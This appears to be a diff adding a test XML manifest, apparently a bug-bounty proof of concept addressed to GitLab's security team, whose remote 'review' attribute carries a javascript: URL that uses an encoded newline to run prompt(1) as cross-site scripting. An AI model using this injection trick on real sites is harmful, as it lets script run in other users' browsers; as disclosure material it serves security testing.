@@ -1,0 +1,10 @@
+<manifest>
+  <remote review="javascript://HelloTheGitlabSecurityTeam%0Aprompt(1)%0A" />
+
+  <project path="test1" name="manifest1" />
+  <project path="test2" name="manifest2" />
+  <project path="test3" name="manifest3" />
+  <project path="test4" name="manifest4" />
+  <project path="test5" name="manifest5" />
+  <project path="test6" name="manifest6" />
+</manifest>
